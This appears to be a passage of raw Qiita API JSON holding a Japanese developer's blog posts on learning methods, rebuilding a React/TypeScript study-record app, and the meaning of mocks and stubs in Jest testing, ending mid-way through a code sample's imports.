暗記ではない、結局は忘れてしまう\n実践を進めていて、これは`暗記では？`と感じていました。`ただ見てた時と何か変わっただろうか？`とも思いました。\n\n**やり方を変えても忘れますが、忘れ方が変わりました。**\n\n\n以前は動画の各セクションのタイトルを見たときに、このセクションでは何を行っていたか？、タイトルの意味がわからない、思い出せないという状態でした。\n\n現在は動画の各セクションタイトルを見たときに、ここでこんなことをやっていたなあ、○○○の方法は確かこんな感じで実現できるんだよなあとぼんやりと学習内容が思い出せるようになりました。\n\n結局、忘れてはしまうのですが、`課題・問題にぶつかったときはここを見返せば、解決できる`、`課題解決のための選択肢を増やせたこと`が明らかに変わったと感じています。\n\n**知識の引き出し、選択肢を増やせたことが自分の中での大きな変化**となりました。\n\n\n# おわりに\n## 学ぶ意欲がある人こそ、勉強方法について再度考えてみてほしい\n毎日何かしら勉強をしている方は、沢山いらっしゃると思います。\n勉強の方向性を間違えると、私のように時間を費やしているにも関わらず、結果にならない悲しい末路を迎えると感じています。\n\nアウトプット学習を行ってみて、劇的に変わったわけではないですが、少しずつ自分で課題解決できる機会が増えたり、プロダクトを作ることができたりするようになってきました。\n\n同じように悩んでいる方の一助になれば幸いです。\n","coediting":false,"comments_count":3,"created_at":"2025-04-27T19:35:07+09:00","group":null,"id":"ccb7510cb84d98e8b1f5","likes_count":155,"private":false,"reactions_count":0,"stocks_count":100,"tags":[{"name":"ポエム","versions":[]},{"name":"学習","versions":[]},{"name":"アウトプット","versions":[]},{"name":"Udemy","versions":[]},{"name":"インプット","versions":[]}],"title":"【Udemyの落とし穴】「見」るだけで満足していませんか？","updated_at":"2025-04-27T19:35:07+09:00","url":"https://qiita.com/asa129/items/ccb7510cb84d98e8b1f5","user":{"description":"0→1でWebアプリケーションを作れるようになるために奮闘中です。\r\nアイコンは@chinchilla.maruさん\r\nhttps://www.instagram.com/chinchilla.maru/","facebook_id":"","followees_count":45,"followers_count":53,"github_login_name":"asa129","id":"asa129","items_count":62,"linkedin_id":"","location":"","name":"","organization":"","permanent_id":3993509,"profile_image_url":"https://s3-ap-northeast-1.amazonaws.com/qiita-image-store/0/3993509/ea9105b8f7fedddb7175e913eeb5c288385a364a/large.png?1739071881","team_only":false,"twitter_screen_name":"jad1290","website_url":""},"page_views_count":93405,"team_membership":null,"organization_url_name":"jisou","slide":false},{"rendered_body":"<h1 data-sourcepos=\"1:1-1:14\">\n<span id=\"はじめに\" class=\"fragment\"></span><a href=\"#%E3%81%AF%E3%81%98%E3%82%81%E3%81%AB\"><i class=\"fa fa-link\"></i></a>はじめに</h1>\n<p data-sourcepos=\"2:1-3:190\">以前作成した学習記録アプリを、リニューアルすることに挑戦しました。<br>\n初めてJavaScriptからTypeScriptに変更したり、ChakraUIやreact-hook-formの導入を行ったりした過程で、学んだこと・気づいたことをまとめてみました。</p>\n<h1 data-sourcepos=\"5:1-5:59\">\n<span id=\"blue_book-リニューアルした学習記録アプリ\" class=\"fragment\"></span><a href=\"#blue_book-%E3%83%AA%E3%83%8B%E3%83%A5%E3%83%BC%E3%82%A2%E3%83%AB%E3%81%97%E3%81%9F%E5%AD%A6%E7%BF%92%E8%A8%98%E9%8C%B2%E3%82%A2%E3%83%97%E3%83%AA\"><i class=\"fa fa-link\"></i></a><img alt=\":blue_book:\" class=\"emoji\" height=\"20\" src=\"https://cdn.qiita.com/emoji/twemoji/unicode/1f4d8.png\" title=\":blue_book:\" width=\"20\" loading=\"lazy\"> リニューアルした学習記録アプリ</h1>\n<p data-sourcepos=\"7:1-7:33\"><iframe id=\"qiita-embed-content__34dd2081113dc635df30036041143cb7\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__34dd2081113dc635df30036041143cb7\" data-content=\"https%3A%2F%2Fnew-study-record.web.app%2F\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"9:1-9:133\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F996f50f2-5939-4251-90bb-71c97b29a985.gif?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=2943e12e4ce701767e655e0f7a70ff52\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F996f50f2-5939-4251-90bb-71c97b29a985.gif?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=2943e12e4ce701767e655e0f7a70ff52\" alt=\"つくった (1).gif\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F996f50f2-5939-4251-90bb-71c97b29a985.gif?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=b70fd801528d66582ce4da39963cbea3 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/996f50f2-5939-4251-90bb-71c97b29a985.gif\" loading=\"lazy\"></a></p>\n<p data-sourcepos=\"11:1-11:60\">リニューアル前との違いは以下になります。</p>\n<ul data-sourcepos=\"12:1-15:0\">\n<li data-sourcepos=\"12:1-12:46\">ChakraUIを使って、デザインを導入</li>\n<li data-sourcepos=\"13:1-13:77\">react-hook-formを使って、フォームにバリデーションを導入</li>\n<li data-sourcepos=\"14:1-15:0\">TypeScriptを使用して、型安全なアプリケーションに変更</li>\n</ul>\n<h1 data-sourcepos=\"16:1-16:38\">\n<span id=\"今回使用した技術スタック\" class=\"fragment\"></span><a href=\"#%E4%BB%8A%E5%9B%9E%E4%BD%BF%E7%94%A8%E3%81%97%E3%81%9F%E6%8A%80%E8%A1%93%E3%82%B9%E3%82%BF%E3%83%83%E3%82%AF\"><i class=\"fa fa-link\"></i></a>今回使用した技術スタック</h1>\n<ul data-sourcepos=\"17:1-22:0\">\n<li data-sourcepos=\"17:1-17:38\">VIte + React + TypeScript　←new!!</li>\n<li data-sourcepos=\"18:1-18:22\">ChakraUI　←new!!!</li>\n<li data-sourcepos=\"19:1-19:10\">supabase</li>\n<li data-sourcepos=\"20:1-20:29\">react-hook-form　←new!!!</li>\n<li data-sourcepos=\"21:1-22:0\">jest + react-testing-library</li>\n</ul>\n<h1 data-sourcepos=\"23:1-23:65\">\n<span id=\"writing_hand-作成する過程で学んだこと気づき\" class=\"fragment\"></span><a href=\"#writing_hand-%E4%BD%9C%E6%88%90%E3%81%99%E3%82%8B%E9%81%8E%E7%A8%8B%E3%81%A7%E5%AD%A6%E3%82%93%E3%81%A0%E3%81%93%E3%81%A8%E6%B0%97%E3%81%A5%E3%81%8D\"><i class=\"fa fa-link\"></i></a><img alt=\":writing_hand:\" class=\"emoji\" height=\"20\" src=\"https://cdn.qiita.com/emoji/twemoji/unicode/270d-fe0f.png\" title=\":writing_hand:\" width=\"20\" loading=\"lazy\"> 作成する過程で学んだこと、気づき</h1>\n<h2 data-sourcepos=\"24:1-24:79\">\n<span id=\"book-公式ドキュメントを読むことの大切さを改めて実感\" class=\"fragment\"></span><a href=\"#book-%E5%85%AC%E5%BC%8F%E3%83%89%E3%82%AD%E3%83%A5%E3%83%A1%E3%83%B3%E3%83%88%E3%82%92%E8%AA%AD%E3%82%80%E3%81%93%E3%81%A8%E3%81%AE%E5%A4%A7%E5%88%87%E3%81%95%E3%82%92%E6%94%B9%E3%82%81%E3%81%A6%E5%AE%9F%E6%84%9F\"><i class=\"fa fa-link\"></i></a><img alt=\":book:\" class=\"emoji\" height=\"20\" src=\"https://cdn.qiita.com/emoji/twemoji/unicode/1f4d6.png\" title=\":book:\" width=\"20\" loading=\"lazy\"> 公式ドキュメントを読むことの大切さを改めて実感</h2>\n<h3 data-sourcepos=\"25:1-25:64\">\n<span id=\"クイックスタートと実装例はよくできている\" class=\"fragment\"></span><a href=\"#%E3%82%AF%E3%82%A4%E3%83%83%E3%82%AF%E3%82%B9%E3%82%BF%E3%83%BC%E3%83%88%E3%81%A8%E5%AE%9F%E8%A3%85%E4%BE%8B%E3%81%AF%E3%82%88%E3%81%8F%E3%81%A7%E3%81%8D%E3%81%A6%E3%81%84%E3%82%8B\"><i class=\"fa fa-link\"></i></a>クイックスタートと実装例はよくできている</h3>\n<p data-sourcepos=\"27:1-27:126\">CI/CDに入門した際、<strong>公式ドキュメントを読むことは大切だ</strong>ということを実感していました。</p>\n<p data-sourcepos=\"29:1-29:188\">今回、登録フォームのバリデーションを作る際に、<code>react-hook-form</code>を導入し、改めて公式ドキュメントを参照することの大切さを学びました。</p>\n<p data-sourcepos=\"31:1-31:51\">その時の奮闘は↓にまとめています。</p>\n<p data-sourcepos=\"33:1-33:51\"><iframe id=\"qiita-embed-content__86c95fbd532128e9a767d144e4ba8bd5\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__86c95fbd532128e9a767d144e4ba8bd5\" data-content=\"https%3A%2F%2Fqiita.com%2Fasa129%2Fitems%2Fd5f63656750ac9ff6e7a\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<h3 data-sourcepos=\"35:1-35:94\">\n<span id=\"ドキュメントを元に自分のプロダクトに取り込めるようになった\" class=\"fragment\"></span><a href=\"#%E3%83%89%E3%82%AD%E3%83%A5%E3%83%A1%E3%83%B3%E3%83%88%E3%82%92%E5%85%83%E3%81%AB%E8%87%AA%E5%88%86%E3%81%AE%E3%83%97%E3%83%AD%E3%83%80%E3%82%AF%E3%83%88%E3%81%AB%E5%8F%96%E3%82%8A%E8%BE%BC%E3%82%81%E3%82%8B%E3%82%88%E3%81%86%E3%81%AB%E3%81%AA%E3%81%A3%E3%81%9F\"><i class=\"fa fa-link\"></i></a>ドキュメントを元に、自分のプロダクトに取り込めるようになった</h3>\n<p data-sourcepos=\"36:1-36:145\">以下の手順を繰り返し行ったことで、<strong>自分のプロダクトに取り込むという感覚</strong>が掴めたと感じています。</p>\n<ol data-sourcepos=\"38:1-44:0\">\n<li data-sourcepos=\"38:1-38:49\">公式ドキュメントのQuickStartを読む</li>\n<li data-sourcepos=\"39:1-39:45\">ドキュメントに記載の例を読む</li>\n<li data-sourcepos=\"40:1-40:93\">ドキュメントの内容を理解する、わからないワードが出たら調べる</li>\n<li data-sourcepos=\"41:1-41:18\">試してみる</li>\n<li data-sourcepos=\"42:1-42:51\">自分のプロダクトに取り込んでみる</li>\n<li data-sourcepos=\"43:1-44:0\">エラーがでたらCopilotに聞く、公式ドキュメント内の情報を調べる</li>\n</ol>\n<p data-sourcepos=\"45:1-45:111\">公式ドキュメントは開発者のために手順を明記してくれていること実感しました。</p>\n<p data-sourcepos=\"47:1-47:289\">最初は、<code>英語で書かれている、見慣れないコードやワードが多くて難しそう</code>と感じましたが、<code>まずはクイックスタートだけでも行ってみると、意外と難しくないかも</code>という感覚を得られたことにも気づきました。</p>\n<h1 data-sourcepos=\"50:1-50:86\">\n<span id=\"runner-急がば回れ時間をかけて理解することの大切さを実感\" class=\"fragment\"></span><a href=\"#runner-%E6%80%A5%E3%81%8C%E3%81%B0%E5%9B%9E%E3%82%8C%E6%99%82%E9%96%93%E3%82%92%E3%81%8B%E3%81%91%E3%81%A6%E7%90%86%E8%A7%A3%E3%81%99%E3%82%8B%E3%81%93%E3%81%A8%E3%81%AE%E5%A4%A7%E5%88%87%E3%81%95%E3%82%92%E5%AE%9F%E6%84%9F\"><i class=\"fa fa-link\"></i></a><img alt=\":runner:\" class=\"emoji\" height=\"20\" src=\"https://cdn.qiita.com/emoji/twemoji/unicode/1f3c3.png\" title=\":runner:\" width=\"20\" loading=\"lazy\"> 急がば回れ、時間をかけて理解することの大切さを実感</h1>\n<p data-sourcepos=\"51:1-51:96\">わからないことをそのままにしないことを意識して開発を進めました。</p>\n<p data-sourcepos=\"53:1-54:85\">そこで感じたのは、<code>時間をかけて(＝自分が納得いくまで、説明ができる状態まで)理解したこと</code>に対しては、<br>\n<strong>スムーズに思い出せる、手が動かせるようになる</strong>ことです。</p>\n<p data-sourcepos=\"56:1-57:207\">TypeScriptに入門した際、講義動画で何気なく<code>Partial</code>という用語が出てきました。<br>\nその時に<code>ドキュメントを読んで使い方を理解</code>→<code>実際にソースを書いてみる</code>→<code>自分のプロダクトに取り込む</code>までを行い、学んだことを記事にしました。</p>\n<p data-sourcepos=\"59:1-59:42\">その時の記事は↓になります。</p>\n<p data-sourcepos=\"61:1-61:51\"><iframe id=\"qiita-embed-content__83b284e0ce43c7d2f5f193542d0fdc91\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__83b284e0ce43c7d2f5f193542d0fdc91\" data-content=\"https%3A%2F%2Fqiita.com%2Fasa129%2Fitems%2F3bf0bb7b8574739ad528\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"63:1-63:119\">その結果、Partialは<code>ここで使おう</code>、<code>使いどころはここだな</code>とわかるようになりました。</p>\n<p data-sourcepos=\"65:1-65:202\">JestのMockについて学んだ際は、どのように使うのか、Mockとは何かを<code>自分なりに理解</code>、<code>まとめて言語化した</code>ことにより理解が進んだと感じています。</p>\n<p data-sourcepos=\"67:1-67:51\"><iframe id=\"qiita-embed-content__6f1cefb815894f72c3e36ca4d175280b\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__6f1cefb815894f72c3e36ca4d175280b\" data-content=\"https%3A%2F%2Fqiita.com%2Fasa129%2Fitems%2F6e26469d8b6becb61a5f\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"70:1-71:171\">テストコードを作る際に、<code>疑問点はAIや有識者に聞く</code>→<code>どのように解決するかを理解</code>→<code>自分で再現できるまで落とし込む</code>ことを実践しました。<br>\n具体的には、Qiitaに記事を書く、何も見ない状態で再現してみる、Copilotの自動補完を使わず書いてみるなどを行ってみました。</p>\n<p data-sourcepos=\"73:1-73:123\">その結果、テストの方針を考えた後、実現したいことをすらすら書けるようになりました。</p>\n<p data-sourcepos=\"75:1-76:84\">また、テストが通らなかった場合は、ここが原因で、ここを改善すれば解消するかもという検討がつくようになりました。<br>\nエラーの解消までの時間が格段に短くなったと感じています。</p>\n<p data-sourcepos=\"78:1-78:142\"><strong>一度しっかり理解すれば、その後は短い時間で解決できる</strong>ことが自分の中で大きな学びとなりました。</p>\n<p data-sourcepos=\"80:1-80:252\">現状はこれ以上理解できない、わからないことは一旦そのままにしておくことも肝心だと思いますが、自分の中で説明できるまで概念を理解することも大切だということを実感しました。</p>\n<h1 data-sourcepos=\"82:1-82:14\">\n<span id=\"おわりに\" class=\"fragment\"></span><a href=\"#%E3%81%8A%E3%82%8F%E3%82%8A%E3%81%AB\"><i class=\"fa fa-link\"></i></a>おわりに</h1>\n<p data-sourcepos=\"83:1-85:113\">ドキュメントを見つつ、CSSフレームワークの導入や、フォームバリデーションの導入ができるようになりました。<br>\n3か月前の私が見たら卒倒しそうです。<br>\n0→1で自分の作りたいものを作れることを目指して、今後も学習を進めていきます。</p>\n<h1 data-sourcepos=\"87:1-87:34\">\n<span id=\"jisouのメンバー募集中\" class=\"fragment\"></span><a href=\"#jisou%E3%81%AE%E3%83%A1%E3%83%B3%E3%83%90%E3%83%BC%E5%8B%9F%E9%9B%86%E4%B8%AD\"><i class=\"fa fa-link\"></i></a>JISOUのメンバー募集中！</h1>\n<p data-sourcepos=\"88:1-91:9\">プログラミングコーチングJISOUでは、新たなメンバーを募集しています。<br>\n日本一のアウトプットコミュニティでキャリアアップしませんか？<br>\n興味のある方は、ぜひホームページをのぞいてみてください！<br>\n▼▼▼</p>\n<p data-sourcepos=\"93:1-93:19\"><iframe id=\"qiita-embed-content__e8e561aa5a321968dc736e05d45a94d4\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__e8e561aa5a321968dc736e05d45a94d4\" data-content=\"https%3A%2F%2Fprojisou.jp\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n","body":"# はじめに\n以前作成した学習記録アプリを、リニューアルすることに挑戦しました。\n初めてJavaScriptからTypeScriptに変更したり、ChakraUIやreact-hook-formの導入を行ったりした過程で、学んだこと・気づいたことをまとめてみました。\n\n# :blue_book: リニューアルした学習記録アプリ\n\nhttps://new-study-record.web.app/\n\n![つくった (1).gif](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/996f50f2-5939-4251-90bb-71c97b29a985.gif)\n\nリニューアル前との違いは以下になります。\n* ChakraUIを使って、デザインを導入\n* react-hook-formを使って、フォームにバリデーションを導入\n* TypeScriptを使用して、型安全なアプリケーションに変更\n\n# 今回使用した技術スタック\n* VIte + React + TypeScript　←new!!\n* ChakraUI　←new!!!\n* supabase\n* react-hook-form　←new!!!\n* jest + react-testing-library\n\n# :writing_hand: 作成する過程で学んだこと、気づき\n## :book: 公式ドキュメントを読むことの大切さを改めて実感\n### クイックスタートと実装例はよくできている\n\nCI/CDに入門した際、**公式ドキュメントを読むことは大切だ**ということを実感していました。\n\n今回、登録フォームのバリデーションを作る際に、`react-hook-form`を導入し、改めて公式ドキュメントを参照することの大切さを学びました。\n\nその時の奮闘は↓にまとめています。\n\nhttps://qiita.com/asa129/items/d5f63656750ac9ff6e7a\n\n### ドキュメントを元に、自分のプロダクトに取り込めるようになった\n以下の手順を繰り返し行ったことで、**自分のプロダクトに取り込むという感覚**が掴めたと感じています。\n\n1. 公式ドキュメントのQuickStartを読む\n2. ドキュメントに記載の例を読む\n3. ドキュメントの内容を理解する、わからないワードが出たら調べる\n4. 試してみる\n5. 自分のプロダクトに取り込んでみる\n6. エラーがでたらCopilotに聞く、公式ドキュメント内の情報を調べる\n\n公式ドキュメントは開発者のために手順を明記してくれていること実感しました。\n\n最初は、`英語で書かれている、見慣れないコードやワードが多くて難しそう`と感じましたが、`まずはクイックスタートだけでも行ってみると、意外と難しくないかも`という感覚を得られたことにも気づきました。\n\n\n# :runner: 急がば回れ、時間をかけて理解することの大切さを実感\nわからないことをそのままにしないことを意識して開発を進めました。\n\nそこで感じたのは、`時間をかけて(＝自分が納得いくまで、説明ができる状態まで)理解したこと`に対しては、\n**スムーズに思い出せる、手が動かせるようになる**ことです。\n\nTypeScriptに入門した際、講義動画で何気なく`Partial`という用語が出てきました。\nその時に`ドキュメントを読んで使い方を理解`→`実際にソースを書いてみる`→`自分のプロダクトに取り込む`までを行い、学んだことを記事にしました。\n\nその時の記事は↓になります。\n\nhttps://qiita.com/asa129/items/3bf0bb7b8574739ad528\n\nその結果、Partialは`ここで使おう`、`使いどころはここだな`とわかるようになりました。\n\nJestのMockについて学んだ際は、どのように使うのか、Mockとは何かを`自分なりに理解`、`まとめて言語化した`ことにより理解が進んだと感じています。\n\nhttps://qiita.com/asa129/items/6e26469d8b6becb61a5f\n\n\nテストコードを作る際に、`疑問点はAIや有識者に聞く`→`どのように解決するかを理解`→`自分で再現できるまで落とし込む`ことを実践しました。\n具体的には、Qiitaに記事を書く、何も見ない状態で再現してみる、Copilotの自動補完を使わず書いてみるなどを行ってみました。\n\nその結果、テストの方針を考えた後、実現したいことをすらすら書けるようになりました。\n\nまた、テストが通らなかった場合は、ここが原因で、ここを改善すれば解消するかもという検討がつくようになりました。\nエラーの解消までの時間が格段に短くなったと感じています。\n\n**一度しっかり理解すれば、その後は短い時間で解決できる**ことが自分の中で大きな学びとなりました。\n\n現状はこれ以上理解できない、わからないことは一旦そのままにしておくことも肝心だと思いますが、自分の中で説明できるまで概念を理解することも大切だということを実感しました。\n\n# おわりに\nドキュメントを見つつ、CSSフレームワークの導入や、フォームバリデーションの導入ができるようになりました。\n3か月前の私が見たら卒倒しそうです。\n0→1で自分の作りたいものを作れることを目指して、今後も学習を進めていきます。\n\n# JISOUのメンバー募集中！\nプログラミングコーチングJISOUでは、新たなメンバーを募集しています。\n日本一のアウトプットコミュニティでキャリアアップしませんか？\n興味のある方は、ぜひホームページをのぞいてみてください！\n▼▼▼\n\nhttps://projisou.jp\n","coediting":false,"comments_count":0,"created_at":"2025-04-27T19:34:01+09:00","group":null,"id":"73cbf320dfcf52cc2690","likes_count":2,"private":false,"reactions_count":0,"stocks_count":1,"tags":[{"name":"初心者","versions":[]},{"name":"ドキュメント","versions":[]},{"name":"個人開発","versions":[]}],"title":"【新技術の取り込みに挑戦】学習記録アプリをリニューアルしました","updated_at":"2025-04-27T19:34:01+09:00","url":"https://qiita.com/asa129/items/73cbf320dfcf52cc2690","user":{"description":"0→1でWebアプリケーションを作れるようになるために奮闘中です。\r\nアイコンは@chinchilla.maruさん\r\nhttps://www.instagram.com/chinchilla.maru/","facebook_id":"","followees_count":45,"followers_count":53,"github_login_name":"asa129","id":"asa129","items_count":62,"linkedin_id":"","location":"","name":"","organization":"","permanent_id":3993509,"profile_image_url":"https://s3-ap-northeast-1.amazonaws.com/qiita-image-store/0/3993509/ea9105b8f7fedddb7175e913eeb5c288385a364a/large.png?1739071881","team_only":false,"twitter_screen_name":"jad1290","website_url":""},"page_views_count":898,"team_membership":null,"organization_url_name":"jisou","slide":false},{"rendered_body":"<h1 data-sourcepos=\"1:1-1:14\">\n<span id=\"はじめに\" class=\"fragment\"></span><a href=\"#%E3%81%AF%E3%81%98%E3%82%81%E3%81%AB\"><i class=\"fa fa-link\"></i></a>はじめに</h1>\n<p data-sourcepos=\"2:1-3:105\">テストで欠かせないモックについて、<code>「そもそもモックとは何か」</code>、<code>「どのような仕組みか」</code>、<code>「いつどのような場合に使えばいいのか」</code>について、理解があやふやな状態でした。<br>\n自分の理解、曖昧な状態を解消するために、学んだことをまとめてみました。</p>\n<h1 data-sourcepos=\"5:1-5:17\">\n<span id=\"モックとは\" class=\"fragment\"></span><a href=\"#%E3%83%A2%E3%83%83%E3%82%AF%E3%81%A8%E3%81%AF\"><i class=\"fa fa-link\"></i></a>モックとは</h1>\n<h2 data-sourcepos=\"6:1-6:63\">\n<span id=\"モックの本来の昔から使われていた意味\" class=\"fragment\"></span><a href=\"#%E3%83%A2%E3%83%83%E3%82%AF%E3%81%AE%E6%9C%AC%E6%9D%A5%E3%81%AE%E6%98%94%E3%81%8B%E3%82%89%E4%BD%BF%E3%82%8F%E3%82%8C%E3%81%A6%E3%81%84%E3%81%9F%E6%84%8F%E5%91%B3\"><i class=\"fa fa-link\"></i></a>モックの本来の（昔から使われていた）意味</h2>\n<p data-sourcepos=\"8:1-8:37\"><iframe id=\"qiita-embed-content__97a58cd4e53a5498aa22bd374191cbc0\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__97a58cd4e53a5498aa22bd374191cbc0\" data-content=\"https%3A%2F%2Fwa3.i-3-i.info%2Fword19051.html\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"10:1-10:75\"><strong><a href=\"https://wa3.i-3-i.info/word19051.html\" rel=\"nofollow noopener\" target=\"_blank\">こちら</a>の記事より引用</strong></p>\n<blockquote data-sourcepos=\"11:1-17:180\">\n<p data-sourcepos=\"11:2-15:9\">モックとは<br>\n「モックアップ」の省略表現。<br>\n用語の中身としては<br>\n「外見だけ、それっぽく出来ています。中身は作ってないから動いたりはしないよ。見た目とかのイメージを確認するためだけに使ってね」な試作品とか模型のこと<br>\nです。</p>\n<blockquote data-sourcepos=\"16:2-17:180\">\n<p data-sourcepos=\"16:3-17:180\">システム開発の場合は、お客さまとの認識合わせのために作ります。<br>\n実際に作る前、お客さまに「こんな物を作りますよ～、イメージと合っていますか～？」確認を取ることで涙目になる事態を回避する</p>\n</blockquote>\n</blockquote>\n<p data-sourcepos=\"19:1-19:182\">本来のモックの言葉の使い方は、<code>こんな見た目で、こんな感じに動きますよ～という超簡単なプロダクト</code>を指すことと理解しました。</p>\n<p data-sourcepos=\"21:1-22:60\">実務で、お客さまと認識合わせを行うため、画面やボタンを作り、このボタンを押して登録するとこの情報が画面表示されるなど、簡素化した画面と資料を作成したことを思い出しました。<br>\n→これがモックだったのかと理解しました。</p>\n<p data-sourcepos=\"24:1-24:87\"><code>Jestのモックと少し意味合いが違う？</code>との疑問も発生しました。</p>\n<h2 data-sourcepos=\"26:1-26:33\">\n<span id=\"テストとしてのモック\" class=\"fragment\"></span><a href=\"#%E3%83%86%E3%82%B9%E3%83%88%E3%81%A8%E3%81%97%E3%81%A6%E3%81%AE%E3%83%A2%E3%83%83%E3%82%AF\"><i class=\"fa fa-link\"></i></a>テストとしてのモック</h2>\n<p data-sourcepos=\"27:1-27:75\"><strong><a href=\"https://wa3.i-3-i.info/word19051.html\" rel=\"nofollow noopener\" target=\"_blank\">こちら</a>の記事より引用</strong></p>\n<blockquote data-sourcepos=\"28:1-30:96\">\n<p data-sourcepos=\"28:2-30:96\">最近では<br>\n部品を呼び出すときにやり取りする内容（リクエストの内容とか）を確認するためのスタブ（テスト対象から呼び出される部品の代わり）<br>\nを意図して「モック」という表現が使われることもあるみたいですね。</p>\n</blockquote>\n<h3 data-sourcepos=\"32:1-32:38\">\n<span id=\"jestでのモックの位置づけ\" class=\"fragment\"></span><a href=\"#jest%E3%81%A7%E3%81%AE%E3%83%A2%E3%83%83%E3%82%AF%E3%81%AE%E4%BD%8D%E7%BD%AE%E3%81%A5%E3%81%91\"><i class=\"fa fa-link\"></i></a>Jestでのモックの位置づけ</h3>\n<p data-sourcepos=\"34:1-34:97\">Jestのドキュメントにあるモック関数は上記の意味合いと理解しました。</p>\n<p data-sourcepos=\"36:1-36:40\"><iframe id=\"qiita-embed-content__6a6169510653fe59ec9dc24279986703\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__6a6169510653fe59ec9dc24279986703\" data-content=\"https%3A%2F%2Fjestjs.io%2Fja%2Fdocs%2Fmock-functions\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"38:1-38:34\"><strong>ドキュメントより引用</strong></p>\n<blockquote data-sourcepos=\"39:1-40:102\">\n<p data-sourcepos=\"39:2-40:102\">関数が持つ実際の実装を除去したり、関数の呼び出し（また、呼び出しに渡されたパラメータも含め）をキャプチャしたり、new によるコンストラクタ関数のインスタンス化をキャプチャできます。<br>\nそうすることでテスト時のみの返り値の設定をすることが可能になります。</p>\n</blockquote>\n<h2 data-sourcepos=\"43:1-43:24\">\n<span id=\"スタブとの違い\" class=\"fragment\"></span><a href=\"#%E3%82%B9%E3%82%BF%E3%83%96%E3%81%A8%E3%81%AE%E9%81%95%E3%81%84\"><i class=\"fa fa-link\"></i></a>スタブとの違い</h2>\n<p data-sourcepos=\"44:1-45:132\">上記と似た位置づけで、業務ではよく<code>スタブ</code>というワードで表現することがあります。<br>\nこの場合、モック＝スタブなのか、モックとスタブに違いがあるのかよくわからなくなりました。</p>\n<h3 data-sourcepos=\"47:1-47:19\">\n<span id=\"スタブとは\" class=\"fragment\"></span><a href=\"#%E3%82%B9%E3%82%BF%E3%83%96%E3%81%A8%E3%81%AF\"><i class=\"fa fa-link\"></i></a>スタブとは</h3>\n<p data-sourcepos=\"48:1-48:37\"><iframe id=\"qiita-embed-content__cde347998d1160f9c3416c1312c6ee67\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__cde347998d1160f9c3416c1312c6ee67\" data-content=\"https%3A%2F%2Fwa3.i-3-i.info%2Fword14933.html\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"50:1-50:75\"><strong><a href=\"https://wa3.i-3-i.info/word14933.html\" rel=\"nofollow noopener\" target=\"_blank\">こちら</a>の記事より引用</strong></p>\n<blockquote data-sourcepos=\"52:1-52:109\">\n<p data-sourcepos=\"52:2-52:109\">テスト対象から呼び出される、本来の部品の代わり（で呼び出される方のやつ）</p>\n</blockquote>\n<p data-sourcepos=\"55:1-56:105\">個人的には、<code>モックとスタブは同義</code>と捉えてもいいのではと判断しました。<br>\n（みなさまの考えやご指摘がありましたらご教示いただけると嬉しいです。）</p>\n<h1 data-sourcepos=\"60:1-60:32\">\n<span id=\"なぜモックを使うのか\" class=\"fragment\"></span><a href=\"#%E3%81%AA%E3%81%9C%E3%83%A2%E3%83%83%E3%82%AF%E3%82%92%E4%BD%BF%E3%81%86%E3%81%AE%E3%81%8B\"><i class=\"fa fa-link\"></i></a>なぜモックを使うのか</h1>\n<p data-sourcepos=\"62:1-63:201\">私は今、学習記録アプリを作成しています。<br>\nここで新規登録モーダルを開き、フォームに項目を入力、登録ボタン押下後、データが登録されることを確認するテストをしたいと考えていました。</p>\n<p data-sourcepos=\"65:1-65:40\"><strong>最初に考えたテストコード</strong></p>\n<div class=\"code-frame\" data-lang=\"tsx\" data-sourcepos=\"66:1-100:3\"><div class=\"highlight\"><pre><code><span class=\"k\">import</span> <span class=\"p\">{</span> <span class=\"nx\">render</span><span class=\"p\">,</span> <span class=\"nx\">screen</span><span class=\"p\">,</span> <span class=\"nx\">waitFor</span> <span class=\"p\">}</span> <span class=\"k\">from</span> <span class=\"dl\">\"</span><span class=\"s2\">@testing-library/react</span><span class=\"dl\">\"</span><span class=\"p\">;</span>\n<span class=\"k\">import</span> <span class=\"nx\">userEvent</span> <span class=\"k\">from</span> <span class=\"dl\">\"</span><span class=\"s2\">@testing-library/user-event</span><span class=\"dl\">\"</span><span class=\"p\">;</span>\n<span class=\"k\">import</span> <span 